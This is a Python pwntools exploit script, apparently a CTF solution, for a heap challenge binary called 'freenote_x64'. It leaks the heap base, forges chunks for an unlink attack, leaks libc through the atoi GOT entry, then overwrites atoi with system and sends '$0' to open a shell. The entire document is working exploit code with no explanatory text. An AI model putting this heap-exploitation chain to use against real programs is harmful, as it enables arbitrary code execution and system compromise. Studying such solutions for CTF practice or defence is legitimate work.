#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./freenote_x64")
elf = ELF("./freenote_x64")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def listPost():
    io.sendlineafter("choice: ", "1")
    
def newPost(content):
    io.sendlineafter("choice: ", "2")
    io.sendlineafter("note: ", str(len(content)))
    io.sendafter("note: ", content)

def editNote(idx, content):
    io.sendlineafter("choice: ", "3")
    io.sendlineafter("number: ", str(idx))
    io.sendlineafter("note: ", str(len(content)))
    io.sendafter("note: ", content)

def delPost(idx):
    io.sendlineafter("choice: ", "4")
    io.sendlineafter("number: ", str(idx))

if __name__ == "__main__":
    for i in xrange(5):
        newPost(str(i) * 0x80)

    delPost(3)
    delPost(1)

    payload = '0' * 0x80 + 'a' * 0x10
    editNote(0, payload)

    success("Step 1: leak heapBase")
    listPost()
    io.recvuntil("a" * 0x10)
    heapBase = u64(io.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - 0x19d0 # 0x1810 + 3 * 0x90 + 0x10
    info("heapBase -> 0x%x" % heapBase)
    chunk0Addr = heapBase + 0x30
    info("chunk0Addr -> 0x%x" % chunk0Addr)
    pause()

    success("Step 2: unlink")
    payload = p64(0x90) + p64(0x80) + p64(chunk0Addr - 0x18) + p64(chunk0Addr - 0x10) + '0' * (0x80 - 8 * 4)
    payload += p64(0x80) + p64(0x90 + 0x90) + '1' * 0x70
    editNote(0, payload)
    delPost(1)
    #  pause()

    success("Step 3: leak libcBase")
    payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0Addr - 0x18)
    payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
    payload = payload.ljust(0x100, '\x00')
    editNote(0, payload)
    listPost()
    io.recvuntil("0. ")
    io.recvuntil("1. ")
    libcBace = u64(io.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.symbols["atoi"]
    info("libcBace -> 0x%x" % libcBace)
    systemAddr = libcBace + libc.symbols["system"]
    pause()

    success("Step 4: hijack & get shell")
    editNote(1, p64(systemAddr))
    io.sendlineafter("choice: ", "$0")

    io.interactive()
    io.close()
